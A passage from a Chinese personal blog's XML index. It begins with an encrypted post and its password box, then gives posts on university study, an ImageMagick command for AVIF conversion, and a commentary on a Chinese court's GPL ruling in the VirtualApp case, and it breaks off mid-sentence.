e95b1f52c2e6562c541289415d3b5c14ff94fc0148f067f2296284c6e7d8114dc955cb10bf1e12e8bdd70405cba3eb603b36f02e4051ef9cd939ea9138493e8567abd9646ef28b114f8f8a3e2d535364ca21e74dae179da6e42b3efb31ee3be1ac229955645b7961c02bd72c9c380c5425fa140c0815ae097062dcc6310b9ed399f1d99a1fbcd5f6124c48a73acc48cbbe1f0077d5ab2287f88a6e667f37a25db37ccdcb892b759ca67f166ee554c8cd71578666f75e33eb95ae8ed4c46eda1ff6c8335d4b95782a07c3f5944361b82c9f65d38bb8ea469228cebaf3c7838752fb6d6b6ed9ffa975e768fd2d4bb06b8911c822d0d99181cb3539d33f0cd0ad5673e18674acd38806bd3c907b548728528b71fba9a9f9ddb0a9d3174784222599e9c8a4df3e502cad20b38c56aedce7170318c0ad49f9d97beed768ccf18e848dba6f7db25e4b15f8f229c44e0647c58fe57f501ace90af14165a4810c75a1be07c52710eaba51a2afeaac0fa013fd249ff3e91699f34097f2a5843b3c3f9b683ab2c00709dda8cd0df83312ab6a00ac97a1285b5132ce2cc064daabb6b76301e046cff0abf1275e72ebddffc3f54e3556c6c46db19700ea30877364b3c8b876649ec7af50bd8ff5233784b278c58a3133a6dea0abb73ca16be9be16074ed7277b0df30c85640b37b1e6b6a5862da85154b5d24d236d331604d14de20ecfa8fabd856f5f8b1acd34e00aff0624fb19376b3e9761f8785be9761cab9b3e4f6c1e0f3245f4595b3eb9fc00457d6da591705155dfb7556eb025c55877e81fe19aac3fea72a813786f5774fdfdf8780e3506751f084d5185eb0a56a4cf84397e0a15eed8da924ad6602b94f362c2de1c060ba7520de6de76645e7ca086ce16072a424639730d44acb6e18ab95731168e7951a0c4f5be67dcd2e47598dae751c38928b8876be829ee4af21f3d3ff697060aab56baed0c2045c19ad7b603e0f1facaf55347ae88454b10ac40b4b67a73a87cd52cc19b4181e065d546d4dc9b94eb64e390ef8367940d254a60e3871c224fc1a6993524de40a411cd6215b2a4abb775c231a9beb0709494c842e3092a66fd97eefd1958f32e54bd11d545cdf3262109fa993cb0f56311567f514e8e4819a3bef562c1159c84fb2027ab51e2dd4467b572f968c25eb1a66347d42038d85701ef435dc636d7b4ccbfe13b534dfe0dac9ca18de751fbf81b0bbb171e280865d5ddbed1e892e8da300c90de8b3c1303febbf26964639fd7e7bcffc1ef0fba3a0886699b2f502f2be68fec59b5f85579393c1590097d834439451778ef85aec27e7774298cca777c57ecb09cab21a4b441a260697abdade91bcee480f21a7cc9333064e940d0185221d1c6dd229724700126e65b11957e7aef7d69b0cc9885438f03a931f3aacb4f7a5c704fe56c8912f053e1dd2aed3f62d5a6b5f78c772d21c091af65fd8ecdfb4975bb9f478052ea5a2ea4562b8eb2383a0115d7ca1e4ba2e66a5ca121c2459fb75984b86b8fd05c0e3ee1bc36d70162dbd264468f3eae9d5d9e0ff73fd4e9e1bb2687d5aeaadb5d51d8e961f32cde7b0a274a655ded4febf9408ddb489bfa451fc68df1650ad41a2ab2f9f646ee51ef365b7cda015f549b5b7cd8260d11ecd4db8b0fdbfce5316a7c2027a037f83564667e2c725b12c04be7079b8a2f9c525931b7b0ee4ab5ef53fc83a31829ffaaf0222e7a9ba5ac9711b73397a53d313639c2acba2ecda520717260c0de76a8ad6688af0eac24c083a0b36ea5f12db21c79304a50cceeaef139303f3362f22cb0eb886a5f5156409034eec87474ea14845293eb744b8324db561e090d0657bb7f8499aa9d069e4acf6f3f63ee8c149b9facff112f7f410d47ce6e1a089db4a0e84096ee227d9c881baa7a8e9d2a3a6ebb944f38f34440da93aea283c45a28ffa315a96cec65642fb6f31db030ce79ec972fbe679a635c759b18f9bde8b850c5b641ec36d9e3cc9d3aabe835659cbfad80217d9a1b9775da752fd4192f91baa7bc37031d34fe18dffd57a7439d6be3f5b3b83db40764ecc0248b83e15f2f87169d6a18e41f976245959128d7562142bb7a584043026eb991e5d06583b845d57202f1498742dac89de6b348db7ed6d54962d468af4d7e3ea948578e16e03b01a157a9c949e3844376d8737e9562e5991099b994c177b98edb069dc2bf4b8ea6121c1ba886c4e1fb334be3f6e08acf9afbcddf53ca0d1329b759f4b9529eaf6ac1eb08799878793496bec1829abc39ab946ca56f13770106145fbc88a4ffcf32813df8f49ae38ea04985c01a28f4a5a800e1d4ca3c393f07b873718926baec771fc3b654a57b7241bb982640be53c5cbfe50993a5bb3cb4baf32ee33e4f16a24d222c9ba5900a50d5ab34dec866b42443725a7705336a094b38ffd17630ca50172aeb8f969552c29b9308eda0491db6729de63f9513d65f9de0c0a01b046264cfa631c1085a6619faa2a4bc9568f96e9654cd37243e5ff3ea6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小心项目的陷阱</title>
      <link href="/2022/01/24/xiao-xin-xiang-mu-de-xian-jing/"/>
      <url>/2022/01/24/xiao-xin-xiang-mu-de-xian-jing/</url>
      
        <content type="html"><![CDATA[<p>本科学有余力的同学，有些会选择跟着老师做项目。大家的动机是好的，但是现实往往会让你失望。在具体操作上，各位同学还要三思而行、谨慎而为。</p><p>林大部分老师的科研水平很令人失望，他们自己完全没什么像样的研究。跟着这样的老师做项目，我们通常也很难得到研究素养上的锻炼。如果你因为参与一些低层次但是没有任何锻炼价值的项目而耽误了大量时间，打乱了自己计划的进度，将会是一件非常得不偿失的事情。</p><p>所谓项目不外乎老师的私活，或学校的 PRP——传说中的本科生研究项目；再不然就是一些带有政治色彩的竞赛项目。总体上说，带本科生项目的老师的水平和责任心都是让人失望的。如果你已经有了充分的思想准备，但仍然还是对某个老师的某个项目有兴趣，那么你必须在决定参加之前，进一步确定该课题是否属于自己的学术兴趣，或者是否对自己的研究有帮助。而你能做出合理判断的前提，必须是你很清楚自己发展的大方向。作为一名学生，不清楚自己的学术兴趣本该是一件极其不正常的现象。但是这现象在我校却很普遍。每当看到同学们在写各种Research Proposal时候东拼西凑的痛苦表情，我就深感遗憾。本文不在于说明如何“寻找或培养学术兴趣”，我们只是提醒各位同学：</p><p>林大的绝大多数所谓项目，都是极其空泛的。不要寄希望于通过做一些项目“发现”自身的学习兴趣。</p>]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImageMagick批量图像格式转换</title>
      <link href="/2022/01/23/imagemagick-pi-liang-tu-xiang-ge-shi-zhuan-huan/"/>
      <url>/2022/01/23/imagemagick-pi-liang-tu-xiang-ge-shi-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<p>近期在优化博客访问体验，需要批量将<code>JPEG</code>转为<code>AVIF</code></p><p><code>mogrify</code> (如<code>convert</code> )是<a href="http://www.imagemagick.org/">ImageMagick</a>附带的实用程序之一</p><p>示例：</p><p><code>$ mogrify -format avif *.jpg</code></p><p>或者使用Google推荐的工具<code>avifenc</code></p><blockquote><p><a href="https://github.com/AOMediaCodec/libavif">github.com/AOMediaCodec/libavif</a></p></blockquote><p><code>./avifenc happy_dog.jpg example.avif --min 0 --max 63 -a end-usage=q -a cq-level=32 -a tune=ssim -a deltaq-mode=3 -a sharpness=3 -y 420</code></p><p>References:</p><blockquote><p><a href="https://codelabs.developers.google.com/codelabs/avif">codelabs.developers.google.com/codelabs/avif</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> ImageMagick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认清自己的技术栈</title>
      <link href="/2022/01/23/ren-qing-zi-ji-de-ji-zhu-zhan/"/>
      <url>/2022/01/23/ren-qing-zi-ji-de-ji-zhu-zhan/</url>
      
        <content type="html"><![CDATA[<h3 id="认清自己的技术栈">认清自己的技术栈</h3><p>随着本科、硕士、博士的扩招下，中国开始享受着“工程师红利”，各行业从业人员受教育程度稳步提升，中国制造产业升级也是国家大计之一，但目前我国存在着新增中高端就业岗位数量跟不上大学、研究生毕业生数量增长的问题，与经济增速下滑相叠加，每年都会看到类似“大学生最难就业季”的新闻，Linda的出身可能难以让你在找工作的时候拿到多份offer，但想要去理想的公司以及职位，你需要对自己的技术栈和目标职位的需求技术栈有足够清醒的认知，及时补足短板。你未来可能会用到的能力包括但不限于：</p><ol type="1"><li><p>本专业的专业知识，这是你安身立命的根本，对本领域有中长期的判断</p></li><li><p>表达能力，如何去说服你的上司还有顾客理解并接受你的idea和产品</p></li><li><p>相关信息检索、过滤、总结、可视化等的能力</p></li><li><p>交际能力，向别人展现自己的价值，在自己需要帮助的时候也能找到最合适的朋友寻求帮助</p></li><li><p>抗压能力，主要是对逆境的适应力、容忍力、耐力，能较好应对生活工作中的挫折</p></li><li><p>独立思考，在信息过载的当下尽量避免被错误消息带节奏</p></li><li><p>时间管理，以后的日子里你会被生活的柴米油盐和很多工作学习以外的杂事消耗精力，再也不是大学以前父母帮你操办大部分事情了，你需要高效管理利用剩余的时间</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 大学 </tag>
            
            <tag> 就业 </tag>
            
            <tag> 发展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>悲壮的学习方式</title>
      <link href="/2022/01/23/bei-zhuang-de-xue-xi-fang-shi/"/>
      <url>/2022/01/23/bei-zhuang-de-xue-xi-fang-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="悲壮的学习方式">悲壮的学习方式</h3><p>古人刻苦学习的故事，直到现在还在我们的身边不断上演。据说每天在图书馆都有几千人在自习。学生趴在山一样高的习题集边上苦苦奋斗，绝对是我校一道的亮丽的风景线。挖空心思研究解题技巧的学生们，与同样挖空心思研究出题技巧的老师们，构成了一个完美的圆环。在二者日复一日的机械劳动中，我只看到纸张、电力，以及粮食不断被浪费，却看不到中华之崛起。</p><p>我无意全盘否定同学们吃苦耐劳的精神，但这份精神充其量只能称为悲壮。我们耗费了大量的时间和精力掌握的那些考点、技巧，在真正的知识殿堂里根本登不上大雅之堂。哪怕我们特征值求得再熟练，积分积得再复杂，中国的载人飞船也不会因此而顺利上天。</p><p>一本1300页的数学手册，上面记录了人类文明从远古直到二十世纪后半叶的主要数学成果。而我校高等数学教材（上下册）所涵盖的内容，不超过其中的130页。一个真正有志于建造科学大厦的人，是不应抱着一块儿砖头精雕细琢的。</p><p>学习最需要的，不是悲壮的毅力，而是对无限未知的渴求。</p><p>最终来说，学习知识的目的是为后继的知识铺垫，以及培养创造性的思维。所谓有效率的学习，应当是以最高的效率获取知识，服务这两个目标。从现状来看，我们想要把什么都搞扎实的学习习惯，其效率是极端低下的，而在我们通过大量习题，最终扎实掌握的信息里，有效的“知识”却又是如此的少。</p><p>今天，你学了多少？</p>]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再看中国法院如何对待GPL</title>
      <link href="/2022/01/21/zai-kan-zhong-guo-fa-yuan-shi-zen-me-dui-dai-gpl/"/>
      <url>/2022/01/21/zai-kan-zhong-guo-fa-yuan-shi-zen-me-dui-dai-gpl/</url>
      
        <content type="html"><![CDATA[<p>最近，朋友推荐我阅读一份和GPL<ins>1</ins>有关的<ins>判决书</ins>，说写得很好。</p><p>抽时间看了一下，果然水平很高，完全不亚于上次我介绍的深圳市中级人民法院写的判决书（判决时间2021年4月30日），上次是罗盒诉风灵（以下简称“风灵案”），我专门写了一篇解读文章：<ins>“看看中国法院是怎么对待GPL的”</ins>。</p><p>这次是罗盒诉玩友（简称“玩友案”），广州知识产权法院判决，判决时间是2021年9月29日。</p><p>总体而言，判决书写得很好，是教科书级别的好。我觉得有必要再写篇文章总结和解读一下，毕竟原文<ins>2</ins>很长，一般人是没有耐心认真读完的。</p><p>不过，判决书仍有个别地方没有说明白，本文最后一章专门讨论一下。</p><h2 id="一总体概述">一、总体概述</h2><p>原告还是“罗盒”（感觉罗盒一直在各种告），被告是“玩友”。</p><blockquote><p>罗盒：济宁市罗盒网络科技有限公司</p><p>玩友：广州市玩友网络科技有限公司</p></blockquote><p>罗盒还顺便告了冠准航公司、奥斯坦公司、祥运公司，因为这几位是帮着玩友收费的。</p><p>罗盒要1500万元，最后只要到了50万元。</p><p>罗盒告玩友说用了它的商业软件VirtualApp，但没有给罗盒钱。</p><p>玩友说你那个是开源软件，我又不需要你服务，要什么钱。</p><p>法院认可VirtualApp是开源软件，认可GPL的效力。</p><p>但由于玩友没有开源，玩友败诉，赔罗盒50万元。</p><p>法院判决亮点：</p><p>和“风灵案”一样：</p><ol type="1"><li>承认GPL是合同。</li><li>承认GPL授权不可撤销。</li><li>用GPL却不开源就是违规。</li><li>违规则GPL授权终止。</li></ol><p>但在本案判决中，法院又浓墨重彩地阐述了以下观点：</p><ol type="1"><li>作者不能在GPL之外添加进一步限制。</li><li>开源不等于免费。</li><li>法院认可GPL具备强传染性。</li></ol><p>不过有个重大问题：<strong>用了GPL后能否转闭源？</strong></p><p>由于这两个案子都是针对GitHub上那个开源版本讨论的，所以都没有正面讨论这个。本文最后部分讨论一下。</p><h2 id="二判决精华">二、判决精华</h2><p>这篇判决书，有很多精华之处，值得反复回味，我简单罗列一下。</p><p>注：判决书原文均以双引号标识。</p><p>法院认为：</p><h3 id="gpl-v3协议具有合同性质">1、GPL V3协议具有合同性质</h3><p>这和“风灵案”中法院的态度是一样的，GPL的效力被正式认可，原告被告都要按照GPL规定的条款玩。</p><blockquote><p>法院说：GPLV3协议的条款“符合合同法关于要约和承诺的规定，通过电子文本形式由授权方或用户加入开源项目中，电子文本是一种有形的表现形式，属于以书面形式订立的合同。综上，GPLV3协议具有合同性质，是授权方和用户订立的格式化著作权协议，属于我国合同法调整的范围。”</p></blockquote><p>简单地说，GPL规定了使用开源软件的人，有什么权利，应遵循什么义务；同时也规定了软件发行者有什么权利和义务。</p><p>然后大家就按这个协议玩，如果有人不遵守，就可以告他。</p><h3 id="用了gpl就永远是gpl的">2、用了GPL，就永远是GPL的</h3><p>罗盒主导开发的VirtualApp（以下简称VA），以前是开源的（2016～2017），用的是GPL；后来罗盒又把GPL声明删了，说不准商业使用，如果商业使用，得给罗盒交钱；再后来，罗盒干脆不再维护GitHub上的版本，专心致志卖商业版了（商业版是闭源的）。</p><p>玩友没有买商业版的VA，用了GitHub上的VA，罗盒不干，认为自己说过要花钱买的，结果玩友不买就用，所以起诉。</p><p>罗盒背后的逻辑是，GitHub上那个版本已经不是GPL的，不是开源的，所以不能随便用，要按自己的要求来用：即购买商业使用授权。</p><p>法院认为，罗盒说的不对，GitHub上那个还是开源的，还是GPL的。</p><blockquote><p>法院查明，“项目管理者asLody于2016年7月7日首次提交涉案VirtualApp项目，于2016年7月8日加入LGPLV3协议，于2016年9月10日将授权许可协议更改为GPLV3协议，于2017年10月29日删除了GPLV3协议，于2017年12月31日停止更新该开源版本并转为开发不开源的商业版本。”</p><p>“本院认为，根据GPL V3协议条款约定和性质，只要某个软件版本加入GPLV3协议，则无法随意删除GPLV3协议，该版本源代码将永久保持开源，即使授权方删除GPLV3协议也无回溯力，授权方只能在后续的版本中变更或删除GPLV3协议，但并不影响此前版本继续适用GPLV3协议的效力。本案中，罗盒公司确认其主张的涉案软件2017年12月30日版本与撤回GPLV3协议即2017年10月29日前的版本差别不大，因此本院认定罗盒公司主张权利的版本仍属于适用GPLV3协议的开源软件。</p></blockquote><p>注意，估计<ins>判决书</ins>原文有Bug，感觉是手误，把上面最后一个日期2017年10月29日误写为2019年10月29日。</p><p>法院说得很明白，GitHub上的那个VA，就是开源的，就是GPL的，虽然你删掉了GPL声明，但你曾经声明过，那就不能撤销。你可以在后续版本用新协议，但这个版本是不能改协议了。</p><p>GitHub有个好处，历史上的所有修改都有记录，都是公开透明的，比如，我一查，就能看到在2017年10月29日，Lody（就是VA的原初作者，罗盒的实际控制人罗迪）把GPL声明给删除了。</p><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">Lody在2017年10月29日删除了GPL声明</p><p>法院的意思就是：删了这几行，也没用，VA也还是GPL的。</p><h3 id="用了gpl就不能加额外限制">3、用了GPL，就不能加额外限制</h3><p>罗盒在GitHub上VA项目的首页写到：</p><p>“当您需要使用GitHub上的代码时，请购买商业授权，获取商业授权后将可以收到最新VirtualApp商业版全部源代码。”</p><p>以下是截图：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://mmbiz.qpic.cn/mmbiz_png/icavwoK66Ip7UUMyM2yLq31lVvMvn5RWHCnEHtz2q61wxiaL610gics1wAiaLdxCJJJPykH14GbW7sKQvcU13RwMuA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">罗盒在GPL之外添加的授权限制（法院认定无效！）</p><p>这么干行吗？能在一个GPL授权的项目上，再加上“请购买商业授权”这样的限制条件呢？</p><p>众所周知，GPL本身就是一种授权，授予用户对开源软件的免费使用，现在罗盒又说要使用者购买授权，这不矛盾了吗？按哪个算？</p><p>其实GPL在第7条里面明确说了：“如果你接收到的程序或其部分，声称受本协议约束，却补充了这种进一步的限制条款，你可以去掉它们。”</p><p>据此，玩友可以大大方方不用理会“请购买商业授权”这种要求。</p><p>GPL不愧是有律师帮着设计出来的，考虑得很周全，大赞！</p><p>法院怎么说呢？法院理解得很明白：</p><blockquote><p>“罗盒公司的商业使用限制保留条款对于用户使用其源代码的目的进行了限制，从而也限制了用户范围，即只有非商业用途的用户才可以使用其源代码，这显然与GPLV3协议的“著佐权”特性矛盾。该限制保留条款也不属于第7条规定的可以添加的6种补充附加条款之一，应属于非许可性附加条款，属于第10条中的“进一步限制”，因此罗盒公司无权在适用GPLV3协议的涉案VirtualApp项目中添加商业使用限制保留条款。综上所述，玩友公司无需遵循该限制保留条款，罗盒公司主张玩友公司违反商业使用限制保留条款缺乏理据，本院不予支持。</p></blockquote><p>判决书还给出一个信息，让我们知道罗盒要的授权费是多少：</p><blockquote><p>“2017年10月12日，工作人员通过QQ联系罗盒公司的法定代表人张璐（QQ号为10890，备注为“张总开源VirtualApp”）询问收费情况，张璐回复‘单款产品一年5万元。‘此后，张璐又回复‘VA商业授权费用：单款APP一年20万元，单独购买技术支持一年15万。’”</p></blockquote><h3 id="用了开源代码产品能收费吗">4、用了开源代码，产品能收费吗？</h3><p>罗盒公司还认为，玩友违背了GPLV3协议，变相收取许可费及不提供开源代码，构成无权使用，其行为构成侵权。</p><blockquote><p>判决书中写到：“罗盒公司主张玩友公司同时违反商业使用限制保留条款以及GPLV3协议（变相收取许可费及不提供开源代码），构成无权使用，其行为构成侵权，应承担侵权责任。”</p></blockquote><p>罗盒的指控很有意思，他说对了一半，就是玩友应该提供源代码，但也错了一半，玩友收的并不是许可费。</p><p>玩友收的是会员费。</p><p>这个会员费是什么呢，法院说：</p><blockquote><p>“经查，从华为应用市场和应用宝上下载的被诉侵权软件有30分钟免费试用时间，之后需支付会员费才可以继续使用。被诉侵权软件的“用户协议”第五条“用户注意事项”规定，你理解并同意支付相关费用（运营维护费用及技术支持费用）以维持本软件的持续运营。”</p></blockquote><p>法院认为，这个会员费就是软件服务费用。</p><p>法院还专门论证了GPL是允许商业使用的、允许收费的。注意下面这段是精华中的精华。</p><blockquote><p>“GPL V3协议规定，所谓自由软件，强调自由，而非免费”，“GPLV3协议旨在保证用户可以自由使用源代码而非免费使用源代码，开源并不等于免费。承前认定，限制开源软件商业使用与GPLV3协议的宗旨相抵触，若强制要求所有开源软件都完全免费或限制商业使用，那么开发者的工作价值将无从体现”，GPLV3协议“并不排斥软件开发者从软件中获取利益，只是盈利的方式有所改变:从过去依赖软件拷贝的销售，转向主要提供软件及信息服务。”</p><p>“简而言之，如果软件可以视作下列组成等式，即：软件＝程序＋文档＋支持＋培训＋服务，虽然代表“软件形态”的程序、文档可以免费，但作为“软件服务”的支持等环节可以收费。本案被诉侵权软件收取会员费是用于运营维护和技术支持，而下载软件是不需要支付费用的。因此，玩友公司收取被诉侵权软件的会员费并不违反GPLV3协议的规定。”</p></blockquote><p>有人会觉得，什么？罗盒就不能收费？玩友就可以收费？</p><p>这里我不想多说（说起来费劲），我只想说：罗盒公开了源码，罗盒可以卖源码，但不能因为别人不买你源码而告人家；玩友也一样，玩友也可以卖软件服务费，但不能因为别人不买而告人家。</p><p>总之，如果开源了，别人想买可以买，别人不买你也不能告。</p><blockquote><p>对，你没有看错，源码也可以卖，但你源码都在GitHub上公开了，你觉得还会有人向你买吗？抑或是你改动了源码然后卖钱，那么买了你源码的人又可以按照GPL第4条免费公开它，所以大家还是可以拿到免费开源版本。</p></blockquote><h3 id="用了gpl自己也要开源">5、用了GPL，自己也要开源</h3><p>上面说，罗盒说对的一半，没错，玩友应该开源。</p><p>法院看得也很清楚：</p><blockquote><p>“本院认为，用户依据GPLV3协议授权可以获取软件源代码进行修改、再发布，那么他必须保证其他用户可以获取到修改后的源代码，这也是GPLV3协议保持开源传染性的核心要求。因此，玩友公司至少应当公开被诉侵权软件中使用了涉案软件沙盒分身功能部分的源代码。”</p></blockquote><p>感觉这里很仁慈，说<strong>至少</strong>应该开源沙盒部分的代码。</p><p>说到这里，这里简要介绍一下玩友的产品到底是个啥：</p><blockquote><p>根据我的大致分析（只能保证大致正确，我没有时间专门测试）：玩友卖的是“微信视频美颜版”这样的东西（涉案一共4款软件），可以在微信的视频通话过程中，实现美颜效果（微信本身是不支持的）。为了实现这功能，玩友做了一个微信的美颜模块（插件），而且要安装在手机沙盒（类似手机上的虚拟机）中才能实现。所以这个“微信视频美颜版”，需要内含一个沙盒（这就是VA干的事！）。</p></blockquote><p>至于玩友是否应该开源除沙盒之外的源代码（也即视频美颜的代码），法院专门分析了GPL的传染性。（所以说这法院不愧是专业法院啊！）</p><h3 id="法院认为gpl是强传染性的">6、法院认为，GPL是强传染性的</h3><p>法院为了说明这个问题，还专门拿安卓举例子，先说明了一下谷歌是怎么把GPL的传染性在安卓操作系统和上层应用隔离开来的。</p><blockquote><p>“为了解决GPL协议过于严格的问题，谷歌公司发布的安卓移动操作系统通过将系统分为多个独立的不同层级框架，并对每个层级适用不同的开源授权许可协议。谷歌公司在安卓操作系统的内核使用了遵循GPL许可协议的开源Linux内核，那么个人或企业为安卓系统开发的应用软件也必须遵循GPL进行公开，这将严重降低企业和个人开发者参与安卓系统开发的积极性，妨碍了整个开源操作系统生态环境的建立。谷歌公司为了解决该问题，通过将GPL的适用局限在安卓系统独立的底层Linux内核空间中，而在上层的类库和应用框架以及用户空间部分则适用较为宽松的ASL开源软件许可协议。由于上层的类库和应用框架以及用户空间部分并不视为底层Linux内核的衍生产品，因此避开了GPL许可协议传染至整个安卓系统，那么安卓系统上层的硬件驱动和应用框架程序就是独立的，其开发者适用ASL进行开发，可以自由选择是否公开其源代码。”</p></blockquote><p>然后，法院承认了GPL的强传染性，认为玩友应该开源整个软件的源代码（包括美颜部分的代码）。</p><blockquote><p>“承前所述，对于在逻辑上与开源代码有关联性且整体发布的衍生作品，只要其中有一部分适用了GPLV3协议发布，那么整个衍生作品都必须适用GPLV3协议而公开。本案中，沙盒分身部分功能代码是作为被诉侵权软件的衍生部分而整体发布的，玩友公司并未举证证明沙盒分身功能部分源代码是独立的，或使用了类似谷歌公司的安卓系统方法，即在各个独立的不同层级框架中适用不同的开源授权许可协议，因此被诉侵权软件应整体适用GPLV3协议，玩友公司应开源整个被诉侵权软件的源代码。综上，玩友公司虽主张被诉侵权软件中只有沙盒分身使用了被诉部分源代码，但被诉侵权软件仍应遵循GPLV3协议向用户开放源代码下载，玩友公司未向用户提供被诉侵权软件源代码下载已经违反GPLV3协议的规定。</p></blockquote><p>如果想进一步了解谷歌如何在安卓中隔离GPL的传染性，可以看看<ins>这篇文章</ins>。</p><h3 id="用了gpl不开源就撤销对你的授权">7、用了GPL不开源，就撤销对你的授权</h3><p>玩友并没有开源自己的产品，那么怎么办？</p><p>那罗盒通过GPL授予玩友的权利统统收回。</p><p>法院先是介绍了德国的做法：</p><blockquote><p>“德国法院倾向于将GPL开源许可协议所设定的条件认定为附解除条件的合同。法院认为，GPL开源许可协议中所设定的使用条件应当认定为“解除条件”，当被许可人违反该条件时，GPL许可协议属无效，被许可人的行为便构成了侵权行为”</p></blockquote><p>然后指出，玩友因不开源而违反了GPL，从而造成授权终止，构成侵权。</p><blockquote><p>“GPLV3协议属于附解除条件的著作权合同，许可条款是版权许可的条件，如果用户违背条款规定，那么许可的前提条件已不复存在，则GPLV3协议终止适用，用户获得的授权也将自动终止。如前所述，玩友公司未向用户提供被诉侵权软件源代码下载已经违反GPLV3协议规定，则玩友公司对涉案软件源代码的复制、发布行为因失去权利来源而构成侵权。”</p></blockquote><p>精华之处就介绍结束了。</p><p>如果对GPL有兴趣，又不想看英文原版，可以读读我写的<ins>《人话解读GPLV3》</ins>。</p><h2 id="三几件小事">三、几件小事</h2><h3 id="不要扯上别人">1. 不要扯上别人</h3><blockquote><p>“罗盒公司还主张冠准航公司、奥斯坦公司、祥运公司与玩友公司构成共同侵权，承担连带责任。本院对此认为，准航公司、奥斯坦公司、祥运公司仅代玩友公司收取用户的会员费，其已对上述含有侵权沙盒分身功能源代码的四款软件具有著作权登记证书做了初步审查，再施加过高的审查注意义务不符常理，故仅凭代收会员充值款项的事实尚不足以认定该三公司与玩友公司构成共同侵权。罗盒公司的该主张缺乏依据，本院不予支持。”</p></blockquote><h3 id="再有人告也不管了">2. 再有人告也不管了</h3><p>如果哪天又冒出一个人，说他是VA的贡献者之一，也向玩友索赔的话，法院说，你找罗盒要钱去。</p><blockquote><p>判决书说：“特别需要指出的是，以后涉案软件的贡献者以同一事实向玩友公司索赔的，若能证明其属于合作作品作者之一的，应基于前述赔偿数额向罗盒公司主张分割赔偿款。”</p></blockquote><h3 id="翻译来自哪里">3. 翻译来自哪里？</h3><p>我在解读“风灵案”的文章中，有一个疑惑：GPL中文翻译版本到底来自哪里？</p><p>从文字上看，和阮坤良版本<ins>3</ins>非常接近，但又有细小的差异，这就让我大惑不解。</p><p>这次终于明白了：</p><p>判决书中说到：“罗盒公司为本案支付了公证费、鉴定费、翻译费。”</p><p>那就是罗盒请的翻译呗。</p><p>而翻译费也着实够便宜，所以译者也就是在阮版上略微做了一点小改动。</p><blockquote><p>“关于维权的合理开支，罗盒公司提交民事委托代理合同一份、律师费发票一张（金额10万元），公证费发票九张（金额合计11500元），鉴定费发票一张（金额30000元），翻译费发票一张（金额820元）。”</p></blockquote><p>这820元，除了翻译GPL V3，估计还包括翻译GitHub用户条款的费用。</p><h2 id="四裁判结果">四、裁判结果</h2><p>简略地讲：</p><p>一、玩友立即停止侵害罗盒，相关侵权软件（共4款）下架，停止相关运营。</p><p>二、玩友赔偿罗盒经济损失及维权合理开支共计50万元。</p><p>这50万是怎么算出来的呢，这里简要说一下，详情见判决书。</p><p>侵权费计算的主要考虑因素：</p><blockquote><p>VA实现的是沙盒分身功能，并非玩友4款软件的核心功能，玩友的核心功能是美颜；2.玩友4款软件虽然在各个平台的下载累计上百万次，但玩友说里面存在刷量；3.VA商业版授权一年20万；4.综合考虑玩友的侵权性质、侵权时间及不履行GPL协议的情况。</p></blockquote><p>维权合理费用：</p><blockquote><p>罗盒为本案支付的公证费、鉴定费、翻译费、律师费。</p></blockquote><p>三、驳回罗盒的其他控诉。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://mmbiz.qpic.cn/mmbiz_jpg/icavwoK66Ip7UUMyM2yLq31lVvMvn5RWH8FYEBLWS2dm2OJQvOb5mU4J27TrbTxzlkZzvk1blwHlADTIhUlHfxg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><em>广州知识产权法院</em></p><h2 id="五还有一个重大问题">五、还有一个重大问题</h2><p>有一个重大问题，“风灵案”和“玩友案”的判决书都没有正面去说。</p><p>玩友认为：</p><blockquote><p>“VirtualApp项目人aslody罔顾社区其他开发者的贡献及相应著作权权利，将开源项目据为私有并进行大肆敛财，违背开源社区的基本准则。”</p></blockquote><p>如果我没有理解错，玩友诟病的是罗盒闭源的那个商业版。</p><p>广州知识产权法院是这么回答的：</p><blockquote><p>“至于玩友公司称涉案软件使用了其他开源项目源代码却将项目据为私有违背开源社区基本准则的问题，在软件开发中使用他人开源代码只要不违反开源协议即属合规行为，罗盒公司在引用其他开源代码时保留了相关权利人信息及开源授权许可协议且保持项目开源，玩友公司该主张缺乏理据，本院不予支持。”</p></blockquote><p>在我看来，这段说得不够清楚，回答得不够完整。</p><p>法院说的是GitHub上那个VA，但罗盒那个已经闭源了的商业版VA是什么性质呢？</p><blockquote><p>所谓闭源软件，就是没有按照任何开源协议发布的软件。罗盒现在的商业版VA（不在GitHub上公开的那个），我看并没有按照开源协议授权，虽然购买授权者可以拿到源码。</p></blockquote><p>这涉及的关键问题是：罗盒能不能把多人共同创作的VirtualApp闭源为自己的商业版？</p><p>我认为，从严格意义上讲，是不可以的。（虽然可能确实有超过90%的代码都是asLody完成的）</p><p>如果罗盒是VA的唯一作者，私有化没问题，当然可以。（参见我对“风灵